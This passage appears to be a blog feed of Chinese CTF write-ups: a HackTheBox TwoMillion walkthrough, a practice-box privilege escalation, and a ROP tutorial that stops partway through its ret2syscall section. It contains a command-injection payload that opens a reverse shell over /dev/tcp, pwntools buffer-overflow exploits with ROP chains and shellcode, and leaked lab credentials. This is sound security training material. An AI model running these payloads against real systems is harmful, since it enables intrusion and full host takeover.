"admin": {
      "GET": {
        "/api/v1/admin/auth": "Check if user is admin"
      },
      "POST": {
        "/api/v1/admin/vpn/generate": "Generate VPN for specific user"
      },
      "PUT": {
        "/api/v1/admin/settings/update": "Update user settings"
      }
    }
```

因为它可能可以将普通用户更改为高权限用户

调试接口，我们修改 `Content-Type: application/json` 时提示缺少参数 `email`

![image.png](/post-images/HackTheBoxMachine%20-%20TwoMillion/image10.png)

添加 `email` 后缺少 `is_admin` ，继续跟着补全参数

![image.png](/post-images/HackTheBoxMachine%20-%20TwoMillion/image11.png)

设置 `is_admin` 为 `1`

![image.png](/post-images/HackTheBoxMachine%20-%20TwoMillion/image12.png)

测试是否修改成功，我们回到管理员接口中的`/api/v1/admin/auth` ，回显`True`

![image.png](/post-images/HackTheBoxMachine%20-%20TwoMillion/image13.png)

再获取管理员账户的`VPN`

![image.png](/post-images/HackTheBoxMachine%20-%20TwoMillion/image14.png)

通过命令也可以拿到

```bash
➜  TwoMillion curl http://2million.htb/api/v1/admin/vpn/generate -X POST -H 'Cookie: PHPSESSID=ldkjilnio1ali642q30g4cs1p4' -H 'Content-Type: application/json' -d '{"username":"admin"}' -o admin.opvn
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 10844    0 10824  100    20  19492     36 --:--:-- --:--:-- --:--:-- 19538
```

但是经过测试，管理员的`opvn`文件也是无法使用的

测试后发现存在命令注入漏洞

![image.png](/post-images/HackTheBoxMachine%20-%20TwoMillion/image15.png)

我们通过来反弹`shell`

```bash
POST /api/v1/admin/vpn/generate HTTP/1.1
Host: 2million.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0) Gecko/20100101 Firefox/139.0
Cookie: PHPSESSID=ldkjilnio1ali642q30g4cs1p4
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
Priority: u=0, i
DNT: 1
Referer: http://2million.htb/home/access
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/json

{
    "username":"$(whoami;/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.58/1234 0>&1')"
}
```

![image.png](/post-images/HackTheBoxMachine%20-%20TwoMillion/image16.png)

## 权限提升

### Recon In www-data

插件监听端口，在内网中发布了`mysql`和`Memcached`

```bash
www-data@2million:~/html$ ss -tulpn
Netid   State    Recv-Q   Send-Q     Local Address:Port      Peer Address:Port  Process
udp     UNCONN   0        0          127.0.0.53%lo:53             0.0.0.0:*
udp     UNCONN   0        0                0.0.0.0:68             0.0.0.0:*
tcp     LISTEN   0        80             127.0.0.1:3306           0.0.0.0:*
tcp     LISTEN   0        1024           127.0.0.1:11211          0.0.0.0:*
tcp     LISTEN   0        511              0.0.0.0:80             0.0.0.0:*      users:(("nginx",pid=1198,fd=6))
tcp     LISTEN   0        4096       127.0.0.53%lo:53             0.0.0.0:*
tcp     LISTEN   0        128              0.0.0.0:22             0.0.0.0:*
tcp     LISTEN   0        511                 [::]:80                [::]:*      users:(("nginx",pid=1198,fd=7))
tcp     LISTEN   0        128                 [::]:22                [::]:*
```

获取 `Memcached` 中的数据，命令网上查即可

```bash
stats items               
STAT items:1:number 1   
STAT items:1:number_hot 0       
....
STAT items:4:evicted_unfetched 0
STAT items:4:evicted_active 0
```

```bash
stats cachedump 1 100
ITEM foo [3 b; 0 s]
END
stats cachedump 4 100
ITEM memc.sess.key.ldkjilnio1ali642q30g4cs1p4 [56 b; 1750433152 s]
END
```

```bash
get foo
VALUE foo 0 3
bar
END

get memc.sess.key.ldkjilnio1ali642q30g4cs1p4
VALUE memc.sess.key.ldkjilnio1ali642q30g4cs1p4 0 56
loggedin|b:1;id|i:13;username|s:6:"sunset";is_admin|i:1;
END
```

但是得到信息貌似并没有什么用

在当前目录下的`.env` 中能找到 `admin` 用户的凭据

```bash
www-data@2million:~/html$ cat .env 
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
```

成功登录进去

```bash
The list of available updates is more than a week old.
To check for new updates run: sudo apt update

You have mail.
Last login: Tue Jun  6 12:43:11 2023 from 10.10.14.6
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

admin@2million:~$ 
```

读取 `user.txt`

```bash
admin@2million:~$ cat user.txt 
e3c66af3c3a55bxxxxxxx
```

### Recon In admin

我们从`banner`信息中能看到`admin`用户有一封邮件

```bash
The list of available updates is more than a week old.
To check for new updates run: sudo apt update

***You have mail.***
Last login: Tue Jun  6 12:43:11 2023 from 10.10.14.6
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

admin@2million:~$ 
```

```bash
admin@2million:/var/mail$ cat admin 
From: ch4p <ch4p@2million.htb>
To: admin <admin@2million.htb>
Cc: g0blin <g0blin@2million.htb>
Subject: Urgent: Patch System OS
Date: Tue, 1 June 2023 10:45:22 -0700
Message-ID: <9876543210@2million.htb>
X-Mailer: ThunderMail Pro 5.2

Hey admin,

I'm know you're working as fast as you can to do the DB migration. While we're partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can't get popped by that.

HTB Godfather
```

> 嗨，管理员，
我知道你正在尽快完成数据库迁移。趁着我们部分服务器宕机，能不能也升级一下我们虚拟主机的操作系统？今年已经出现了几个严重的 Linux 内核 CVE 漏洞。OverlayFS/FUSE 的那个漏洞看起来很糟糕。我们不能被它给坑了。
> 

### **CVE-2023-0386**

直接明牌了

利用链接：https://github.com/xkaneiki/CVE-2023-0386

跟着`Readme`敲就行

![image.png](/post-images/HackTheBoxMachine%20-%20TwoMillion/image17.png)

读取 `root.txt`

```bash
root@2million:/root# cat root.txt 
c7bea054524b8584598731e5cb0441bb
```

## 总结 & 小彩蛋

不难，但是步骤多，在前期需要进行很多枚举

`root`目录下`thank_you.json` 是一串加密后的数据

```bash
root@2million:/root# cat thank_you.json 
{"encoding": "url", "data": "%7B%22encoding%22:%20%22hex%22,%20%22data%22:%20%227b22656e6372797074696f6e223a2022786f72222c2022656e6372707974696f6e5f6b6579223a20224861636b546865426f78222c2022656e636f64696e67223a2022626173653634222c202264617461223a20224441514347585167424345454c43414549515173534359744168553944776f664c5552765344676461414152446e51634454414746435145423073674230556a4152596e464130494d556745596749584a51514e487a7364466d494345535145454238374267426942685a6f4468595a6441494b4e7830574c526844487a73504144594848547050517a7739484131694268556c424130594d5567504c525a594b513848537a4d614244594744443046426b6430487742694442306b4241455a4e527741596873514c554543434477424144514b4653305046307337446b557743686b7243516f464d306858596749524a41304b424470494679634347546f4b41676b344455553348423036456b4a4c4141414d4d5538524a674952446a41424279344b574334454168393048776f334178786f44777766644141454e4170594b67514742585159436a456345536f4e426b736a41524571414130385151594b4e774246497745636141515644695952525330424857674f42557374427842735a58494f457777476442774e4a30384f4c524d61537a594e4169734246694550424564304941516842437767424345454c45674e497878594b6751474258514b45437344444767554577513653424571436c6771424138434d5135464e67635a50454549425473664353634c4879314245414d31476777734346526f416777484f416b484c52305a5041674d425868494243774c574341414451386e52516f73547830774551595a5051304c495170594b524d47537a49644379594f4653305046776f345342457454776774457841454f676b4a596734574c4545544754734f414445634553635041676430447863744741776754304d2f4f7738414e6763644f6b31444844464944534d5a48576748444267674452636e4331677044304d4f4f68344d4d4141574a51514e48335166445363644857674944515537486751324268636d515263444a6745544a7878594b5138485379634444433444433267414551353041416f734368786d5153594b4e7742464951635a4a41304742544d4e525345414654674e4268387844456c6943686b7243554d474e51734e4b7745646141494d425355644144414b48475242416755775341413043676f78515241415051514a59674d644b524d4e446a424944534d635743734f4452386d4151633347783073515263456442774e4a3038624a773050446a63634444514b57434550467734344241776c4368597242454d6650416b5259676b4e4c51305153794141444446504469454445516f36484555684142556c464130434942464c534755734a304547436a634152534d42484767454651346d45555576436855714242464c4f7735464e67636461436b434344383844536374467a424241415135425241734267777854554d6650416b4c4b5538424a785244445473615253414b4553594751777030474151774731676e42304d6650414557596759574b784d47447a304b435364504569635545515578455574694e68633945304d494f7759524d4159615052554b42446f6252536f4f4469314245414d314741416d5477776742454d644d526f6359676b5a4b684d4b4348514841324941445470424577633148414d744852566f414130506441454c4d5238524f67514853794562525459415743734f445238394268416a4178517851516f464f676354497873646141414e4433514e4579304444693150517a777853415177436c67684441344f4f6873414c685a594f424d4d486a424943695250447941414630736a4455557144673474515149494e7763494d674d524f776b47443351634369554b44434145455564304351736d547738745151594b4d7730584c685a594b513858416a634246534d62485767564377353043776f334151776b424241596441554d4c676f4c5041344e44696449484363625744774f51776737425142735a5849414242454f637874464e67425950416b47537a6f4e48545a504779414145783878476b6c694742417445775a4c497731464e5159554a45454142446f6344437761485767564445736b485259715477776742454d4a4f78304c4a67344b49515151537a734f525345574769305445413433485263724777466b51516f464a78674d4d41705950416b47537a6f4e48545a504879305042686b31484177744156676e42304d4f4941414d4951345561416b434344384e467a464457436b50423073334767416a4778316f41454d634f786f4a4a6b385049415152446e514443793059464330464241353041525a69446873724242415950516f4a4a30384d4a304543427a6847623067344554774a517738784452556e4841786f4268454b494145524e7773645a477470507a774e52516f4f47794d3143773457427831694f78307044413d3d227d%22%7D"}
```

可以通过这个步骤来揭秘

![image.png](/post-images/HackTheBoxMachine%20-%20TwoMillion/image18.png)

```bash
Dear HackTheBox Community,

We are thrilled to announce a momentous milestone in our journey together. With immense joy and gratitude, we celebrate the achievement of reaching 2 million remarkable users! This incredible feat would not have been possible without each and every one of you.

From the very beginning, HackTheBox has been built upon the belief that knowledge sharing, collaboration, and hands-on experience are fundamental to personal and professional growth. Together, we have fostered an environment where innovation thrives and skills are honed. Each challenge completed, each machine conquered, and every skill learned has contributed to the collective intelligence that fuels this vibrant community.

To each and every member of the HackTheBox community, thank you for being a part of this incredible journey. Your contributions have shaped the very fabric of our platform and inspired us to continually innovate and evolve. We are immensely proud of what we have accomplished together, and we eagerly anticipate the countless milestones yet to come.

Here's to the next chapter, where we will continue to push the boundaries of cybersecurity, inspire the next generation of ethical hackers, and create a world where knowledge is accessible to all.

With deepest gratitude,

The HackTheBox Team
```]]></content:encoded>
            <category>靶机</category>
            <category>HackTheBox</category>
            <category>Linux</category>
            <category>FUZZ</category>
            <category>CVE-2023-0386</category>
        </item>
        <item>
            <title><![CDATA[群U靶机 - Tools]]></title>
            <link>https://www.sunsetaction.top/2025/06/16/群U靶机Tools</link>
            <guid isPermaLink="false">https://www.sunsetaction.top/2025/06/16/群U靶机Tools</guid>
            <pubDate>Mon, 16 Jun 2025 00:00:00 GMT</pubDate>
            <description><![CDATA[Tools Recon 端口扫描 爆破 1337 访问80端口提示 1337 端口是要我们输入什么 AI 脚本直接爆破 得到凭据 welcome:learnpwntools 缓冲区溢出 查看 sudo 权限 运行，发现会有 Segmentation fault 拉出来反编译一看存在缓存区溢出漏洞 查...]]></description>
            <content:encoded><![CDATA[
# Tools

## Recon

端口扫描

```bash
➜  ~ nmap -sT -min-rate 5000 192.168.56.82
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-16 15:51 CST
Nmap scan report for 192.168.56.82
Host is up (0.00058s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:43:CC:F4 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 13.24 seconds
```

## 爆破 1337

访问`80`端口提示

![image.png](/post-images/群U靶机Tools/image.png)

`1337` 端口是要我们输入什么

```bash
➜  ~ nc 192.168.56.82 1337
Please input [152]: 152
Please input [921]: 921
Please input [441]: 441
Please input [105]: 105
Please input [534]: 534
Please input [192]: 192
Please input [626]: 626
Please input [968]: 968
Please input [674]: 674
Please input [494]: 494
Please input [768]: 768
Please input [808]: 808
Please input [365]: 365
Please input [438]: 438
Please input [975]: 975
Please input [165]: 165
Please input [796]: 796
Please input [892]:
```

`AI` 脚本直接爆破

```bash
import socket
import re
import time

# --- 配置 ---
HOST = '192.168.56.82'  # 目标服务器 IP 地址
PORT = 1337  # 目标服务器端口
# ------------

# 正则表达式，用于从文本中提取方括号内的数字
pattern = re.compile(r"\[(\d+)\]")

# 定义一个函数，从socket中读取数据，直到遇到特定的分隔符
def read_until(sock, delimiter):
    """从 sock 中读取数据，直到接收到 delimiter 为止"""
    data = b""
    while not data.endswith(delimiter):
        try:
            # 一次只读取一个字节，避免读取过多内容
            chunk = sock.recv(1)
            if not chunk:  # 如果连接关闭，recv会返回空字节串
                return data  # 返回已接收的数据
            data += chunk
        except socket.timeout:
            # 如果发生超时，也返回已接收的数据
            print("\n[!] 读取超时")
            return data
    return data

try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        # 设置一个超时，防止脚本在任何recv操作上永久卡住
        s.settimeout(3)
        print(f"[*] 连接到 {HOST}:{PORT}...")
        s.connect((HOST, PORT))
        print("[+] 连接成功！")

        while True:
            # 读取服务器的提示，直到 ": " 出现
            # 我们用 b': ' 是因为它是一个字节字符串
            prompt_bytes = read_until(s, b': ')

            # 如果读取到的数据为空，说明连接可能已断开
            if not prompt_bytes:
                print("\n[*] 连接已关闭。")
                break

            # 将字节解码为字符串以便处理
            prompt_str = prompt_bytes.decode('utf-8')
            print(f"[<] 收到: {prompt_str}", end='')  # 用 end='' 避免打印多余的换行

            # 在收到的提示中查找数字
            match = pattern.search(prompt_str)

            if match:
                # 提取数字
                number_to_send = match.group(1)

                # 准备要发送的数据（数字 + 换行符）
                response = (number_to_send + '\n').encode('utf-8')

                print(f" [>] 发送: {number_to_send}")  # 在同一行打印发送内容

                # 发送响应
                s.sendall(response)

                # 短暂延迟，有时可以避免竞态条件
                time.sleep(0.1)
            else:
                # 如果在提示中没有找到数字，说明挑战结束了
                print("\n\n[*] 未找到挑战数字，假定挑战已完成。")
                print("[*] 服务器最终响应：")
                print("====================================")
                print(prompt_str.strip())  # 打印我们已收到的部分

                # 尝试再多接收一些数据，因为flag可能跟在后面
                try:
                    final_data = s.recv(4096).decode('utf-8').strip()
                    if final_data:
                        print(final_data)
                except socket.timeout:
                    pass  # 没有更多数据是正常的

                print("====================================")
                break

except ConnectionRefusedError:
    print(f"[!] 连接被拒绝。请检查 IP ({HOST}) 和端口 ({PORT})。")
except socket.timeout:
    print("[!] 连接超时。服务器没有在规定时间内响应。")
except Exception as e:
    print(f"[!] 发生未知错误: {e}")

print("[*] 脚本执行完毕。")

```

得到凭据 `welcome`:`learnpwntools`

```bash
[<] 收到: Please input [407]:  [>] 发送: 407
[<] 收到: Please input [510]:  [>] 发送: 510
[<] 收到: user/pass:welcome/learnpwntools
```

## 缓冲区溢出

查看 `sudo` 权限

```bash
welcome@Tools:~$ sudo -l
Matching Defaults entries for welcome on Tools:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User welcome may run the following commands on Tools:
    (ALL) NOPASSWD: /opt/find_backdoor
```

运行，发现会有 `Segmentation fault`

```bash
welcome@Tools:~$ /opt/find_backdoor       
please input                                      
111111111111111111111111111                                                                                       
ok,bye!!!111111111111111111111111111                                                                              
ok,bye!!!                                                                                                         
Segmentation fault 
```

拉出来反编译一看存在缓存区溢出漏洞

![image.png](/post-images/群U靶机Tools/image1.png)

查看安全机制，裸奔

```bash
welcome@Tools:~$ file /opt/find_backdoor 
/opt/find_backdoor: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=1c72ddcad651c7f35bb655e0ddda5ecbf8d31999, not stripped
welcome@Tools:~$ checksec /opt/find_backdoor 
[*] '/opt/find_backdoor'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x400000)
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No
```

`shift+F12`查看字符串，存在 `/bin/sh`

![image.png](/post-images/群U靶机Tools/image2.png)

查看 `plt` ，有`system`函数，可以直接用

```bash
pwndbg> plt
Section .plt 0x401020 - 0x401060:
0x401030: puts@plt
0x401040: system@plt
0x401050: gets@plt
```

有 `system` 和 `/bin/sh` ，直接梭哈

计算偏移值，得到`23`

```bash
➜  ttt /usr/bin/msf-pattern_create -l 200
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab...Ag0Ag1Ag2Ag3Ag4Ag5Ag
```

```bash
pwndbg> x/xg 0x7fffffffdf58
0x7fffffffdf58: 0x3765413665413565
```

```bash
(pwn) ➜  ttt /usr/bin/msf-pattern_offset -l 200 -q 0x3765413665413565        
[*] Exact match at offset 23
```

拿一下需要用到的地址

```bash
welcome@Tools:~$ ROPgadget --binary /opt/find_backdoor --string "/bin/sh"
Strings information
============================================================
0x000000000040201b : /bin/sh
```

```
welcome@Tools:~$ ROPgadget --binary /opt/find_backdoor --only "pop|ret"
Gadgets information
============================================================
0x00000000004011fb : pop rdi ; ret
```

```bash
welcome@Tools:~$ ROPgadget --binary /opt/find_backdoor --only "pop|ret"
Gadgets information
============================================================
0x0000000000401016 : ret
```

编写利用脚本

```bash
from pwn import *
r = ssh(host='192.168.56.82', user='welcome', password='learnpwntools')
p = r.process(['sudo', '/opt/find_backdoor']) 
system_addr = 0x401040
bin_sh_addr = 0x000000000040201b
pop_rdi_addr = 0x00000000004011fb
ret = 0x0000000000401016

payload = b'A' * 23 + p64(ret) + p64(pop_rdi_addr) + p64(bin_sh_addr) + p64(system_addr)
p.sendlineafter(b'please input',payload)
p.interactive()
```

```bash
    IBT:      Disabled
[+] Starting remote process None on 192.168.56.82: pid 1105
[!] ASLR is disabled for '/opt/find_backdoor'!
[*] Switching to interactive mode

AAAAAAAAAAAAAAAAAAAAAAA\x16\x10@
ok,bye!!!
$ $ whoami
welcome
```

![image.png](/post-images/群U靶机Tools/image3.png)

![image.png](/post-images/群U靶机Tools/image4.png)]]></content:encoded>
            <category>靶机</category>
            <category>PWN</category>
            <category>ROP</category>
            <category>ret2text</category>
            <category>Crack</category>
        </item>
        <item>
            <title><![CDATA[PWN - 基本ROP]]></title>
            <link>https://www.sunsetaction.top/2025/06/15/PWN - 基本ROP</link>
            <guid isPermaLink="false">https://www.sunsetaction.top/2025/06/15/PWN - 基本ROP</guid>
            <pubDate>Sat, 14 Jun 2025 00:00:00 GMT</pubDate>
            <description><![CDATA[PWN 基本ROP https://ctf wiki.org/pwn/linux/user mode/stackoverflow/x86/basic rop/ 这里用到的所有题目：https://github.com/ctf wiki/ctf challenges/tree/master/pwn/l...]]></description>
            <content:encoded><![CDATA[
# PWN - 基本ROP

> https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/
> 

这里用到的所有题目：https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/linux/user-mode/stackoverflow/

`HackTheBox - Ellingson` 碰到缓冲区溢出，无从下手，故有此篇

## ret2text

`ret2text` 即控制程序执行程序本身已有的的代码 (即， `.text` 段中的代码) 

收查看程序保护机制

```bash
➜  ret2text checksec ret2text          
[*] '/root/Desktop/Test/StackBufferOverFlow/ret2text/ret2text'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    Stripped:   No
    Debuginfo:  Yes
```

仅仅开启`NX` ，并且是 `32` 位程序

![image.png](/post-images/PWN%20-%20基本ROP/image.png)

`gets`函数，很明显存在缓冲区溢出漏洞，并且没有做边界保护

并且`secure`函数中有 `/bin/sh` 

```bash
void secure()
{
  unsigned int v0; // eax
  int input; // [esp+18h] [ebp-10h] BYREF
  int secretcode; // [esp+1Ch] [ebp-Ch]

  v0 = time(0);
  srand(v0);
  secretcode = rand();
  __isoc99_scanf(&unk_8048760, &input);
  if ( input == secretcode )
    system("/bin/sh");
}
```

定位`system`函数

```bash
pwndbg> disas secure
Dump of assembler code for function secure:
   0x080485fd <+0>:     push   ebp
   0x080485fe <+1>:     mov    ebp,esp
   0x08048600 <+3>:     sub    esp,0x28
   0x08048603 <+6>:     mov    DWORD PTR [esp],0x0
   0x0804860a <+13>:    call   0x8048470 <time@plt>
   0x0804860f <+18>:    mov    DWORD PTR [esp],eax
   0x08048612 <+21>:    call   0x80484b0 <srand@plt>
   0x08048617 <+26>:    call   0x80484e0 <rand@plt>
   0x0804861c <+31>:    mov    DWORD PTR [ebp-0xc],eax
   0x0804861f <+34>:    lea    eax,[ebp-0x10]
   0x08048622 <+37>:    mov    DWORD PTR [esp+0x4],eax
   0x08048626 <+41>:    mov    DWORD PTR [esp],0x8048760
   0x0804862d <+48>:    call   0x80484f0 <__isoc99_scanf@plt>
   0x08048632 <+53>:    mov    eax,DWORD PTR [ebp-0x10]
   0x08048635 <+56>:    cmp    eax,DWORD PTR [ebp-0xc]
   0x08048638 <+59>:    jne    0x8048646 <secure+73>
   0x0804863a <+61>:    mov    DWORD PTR [esp],0x8048763
   0x08048641 <+68>:    call   0x8048490 <system@plt>
   0x08048646 <+73>:    leave
   0x08048647 <+74>:    ret
End of assembler dump.
```

在`0x0804863a`处

接下来计算偏移量，使用 `pwndbg`

反编译`main`找到`gets` `0x080486ae`

```bash
pwndbg> disas main
Dump of assembler code for function main:
   0x08048648 <+0>:     push   ebp
   0x08048649 <+1>:     mov    ebp,esp
   0x0804864b <+3>:     and    esp,0xfffffff0
   0x0804864e <+6>:     add    esp,0xffffff80
   0x08048651 <+9>:     mov    eax,ds:0x804a060
   0x08048656 <+14>:    mov    DWORD PTR [esp+0xc],0x0
   0x0804865e <+22>:    mov    DWORD PTR [esp+0x8],0x2
   0x08048666 <+30>:    mov    DWORD PTR [esp+0x4],0x0
   0x0804866e <+38>:    mov    DWORD PTR [esp],eax
   0x08048671 <+41>:    call   0x80484d0 <setvbuf@plt>
   0x08048676 <+46>:    mov    eax,ds:0x804a040
   0x0804867b <+51>:    mov    DWORD PTR [esp+0xc],0x0
   0x08048683 <+59>:    mov    DWORD PTR [esp+0x8],0x1
   0x0804868b <+67>:    mov    DWORD PTR [esp+0x4],0x0
   0x08048693 <+75>:    mov    DWORD PTR [esp],eax
   0x08048696 <+78>:    call   0x80484d0 <setvbuf@plt>
   0x0804869b <+83>:    mov    DWORD PTR [esp],0x804876c
   0x080486a2 <+90>:    call   0x8048480 <puts@plt>
   0x080486a7 <+95>:    lea    eax,[esp+0x1c]
   0x080486ab <+99>:    mov    DWORD PTR [esp],eax
   0x080486ae <+102>:   call   0x8048460 <gets@plt>
   0x080486b3 <+107>:   mov    DWORD PTR [esp],0x80487a4
   0x080486ba <+114>:   call   0x8048450 <printf@plt>
   0x080486bf <+119>:   mov    eax,0x0
   0x080486c4 <+124>:   leave
   0x080486c5 <+125>:   ret
End of assembler dump.
```

在`gets`处设置断点

```bash
pwndbg> b *0x080486ae
Breakpoint 1 at 0x80486ae: file ret2text.c, line 24.
```

`run`然后观察栈帧

```bash
pwndbg> run                 
Starting program: /root/Desktop/Test/StackBufferOverFlow/ret2text/ret2text 
warning: Unable to find libthread_db matching inferior''s thread library, thread debugging will not be available.
There is something amazing here, do you know anything?
                                                         
Breakpoint 1, 0x080486ae in main () at ret2text.c:24
warning: 24     ret2text.c: No such file or directory
Warning: Avoided exploring possible address 0xfffdade8.                                                                                                                                                                             
You can explicitly explore it with `vmmap-explore 0xfffda000`
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
───────────────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────────────────────────────────────────
 EAX  0xffffcfac ◂— 0   
 EBX  0xf7f9ae14 ◂— 0x232d0c /* '\x0c-#' */                                                                                                                                                                                         
 ECX  0xf7f9c8e0 ◂— 0
 EDX  0
 EDI  0xf7ffcb60 (_rtld_global_ro) ◂— 0
 ESI  0x80486d0 (__libc_csu_init) ◂— push ebp
 EBP  0xffffd018 ◂— 0
 ESP  0xffffcf90 —▸ 0xffffcfac ◂— 0
 EIP  0x80486ae (main+102) —▸ 0xfffdade8 ◂— 0xfffdade8
```

可以看到`EBP` =`0xffffd018` ，`ESP` =`0xffffcfa`

```bash
pwndbg> p/d 0xffffd018 - 0xffffcfac
$1 = 108
```

编写`exp`  

```bash
(pwn) ➜  ret2text cat exp.py
from pwn import *

sh = process('./ret2text')
target = 0x0804863a
payload = b'A' * 112 + p32(target)
sh.sendline(payload)
sh.interactive()
```

```bash
(pwn) ➜  ret2text python exp.py
[+] Starting local process './ret2text': pid 3343
[*] Switching to interactive mode
There is something amazing here, do you know anything?
Maybe I will tell you next time !$ whoami
root
$  
```

## **ret2shellcode**

`ret2shellcode`，即控制程序执行 `shellcode` 代码。通常情况下，shellcode 需要我们自行编写，即此时我们需要自行向内存中填充一些可执行的代码。
查看保护机制，未开启任何保护

```bash
➜  ret2shellcode checksec ret2shellcode 
[*] '/root/Desktop/Test/StackBufferOverFlow/ret2shellcode/ret2shellcode'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x8048000)
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No
    Debuginfo:  Yes
```

依旧是`gets` ，存在缓冲区溢出漏洞

![image.png](/post-images/PWN%20-%20基本ROP/image1.png)

但是这次并没有其他函数，也没有 `/bin/sh` 的身影

这里使用`strncpy`将`s`传递到`buf2`

![image.png](/post-images/PWN%20-%20基本ROP/image2.png)

我们调试一下程序，查看`bss`区域是否拥有读写权限

![image.png](/post-images/PWN%20-%20基本ROP/image3.png)

```bash
 0x804a000  0x804b000 rw-p     1000   1000 ret2shellcode
```

那么思路就是：`shellcode +（偏移值 - len(shellcode)）* A  + buf2add`

计算偏移量

首先生成`200`长度但是每一段都是唯一的字符

```bash
pwndbg> cyclic 200
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
```

![image.png](/post-images/PWN%20-%20基本ROP/image4.png)

返回地址被`daab` 覆盖上去了，再计算偏移量

```bash
pwndbg> cyclic -l daab
Finding cyclic pattern of 4 bytes: b'daab' (hex: 0x64616162)
Found at offset 112
```

偏移量和`buf2`地址我们都知道了，直接编写`payload`

```bash
from pwn import *
shellcode = asm(shellcraft.sh())
shellcode_pad = shellcode + (112 - (len(shellcode))) * b'A'
buf2_add = 0x804a080
sh = process('./ret2shellcode')
sh.sendline(shellcode_pad + p32(buf2_add))
sh.interactive()
```

```bash
root@sunset-virtual-machine:~# python3 exp.py 
[+] Starting local process './ret2shellcode': pid 58718
[*] Switching to interactive mode
No system for you this time !!!
bye bye ~$ id
uid=0(root) gid=0(root) groups=0(root)
```

## **ret2syscall**

`ret2syscall`，即控制程序执行系统调用，获取 `shell`。

查看程序，`32`位，静态程序，没有使用动态链接库

```bash
➜  ret2syscall file ret2syscall 
ret2syscall: ELF 32-bit LSB executable, Intel i386, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.24, BuildID[sha1]=2bff0285c2706a147e7b150493950de98f182b78, with debug_info, not stripped
```

查看保护机制，栈不可执行，无法使用`ret2shellcode`

```bash
➜  ret2syscall checksec ret2syscall            
[*] '/root/Desktop/Test/StackBufferOverFlow/ret2syscall/ret2syscall'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    Stripped:   No
    Debuginfo:  Yes
```

这里还涉及到系统调用，一般我们通过一下系统调用来获得`shell`

```bash
execve("/bin/sh",NULL,NULL)
```

当遇到`32`位程序时，需要使得：

- 系统调用号，即 eax 应该为 `0xb`（`0xb` 为 `execve` 对应的系统调用号）也就是`11`
- 第一个参数，即 ebx 应该指向 `/bin/sh` 的地址，其实执行 sh 的地址也可以。
- 第二个参数，即 ecx 应该为 `0`
- 第三个参数，即 edx 应该为 `0`

最后将系统调用和参数都填入寄存器后，我们再让系统触发 `0x80` 号中断（`int 0x80`）

`Linux`对系统调用的调用必须通过执行`int $0x80`汇编指令，这条指令会产生向量为`128`的编程异常

IDA 反编译程序，依旧是`gets` ，存在缓冲区溢出漏洞

![image.png](/post-images/PWN%20-%20基本ROP/image5.png)

`shift` + `F12` 查看程序字符串，能看到 `/bin/sh` 我们刚好可以利用

![image.png](/post-images/PWN%20-%20基本ROP/image6.png)

但是因为开启了 `NX` 我们无法往栈上写，写了也无法执行，也不存在`system("/bin/sh")` 代码段，程序是静态的，所以 `ret2shellcode` `ret2text` `ret2libc` 都无法使用，但是存在`/bin/sh` 代码片段，所以我们可以尝试 `ret2syscall`

通过`ROPgadget` 查找需要用到寄存器指令

`pop eax ; ret` 地址为 `0x080bb196`

```bash
➜  ret2syscall ROPgadget --binary ret2syscall --only "pop|ret" | grep eax
0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret
**0x080bb196 : pop eax ; ret**
0x0807217a : pop eax ; ret 0x80e
0x0804f704 : pop eax ; ret 3
0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret
```

发现一串连续的将`ebx~edx`弹出的`pop edx ; pop ecx ; pop ebx ; ret` ，地址为`0x0806eb90`

```bash
➜  ret2syscall ROPgadget --binary ret2syscall --only "pop|ret" | grep ebx
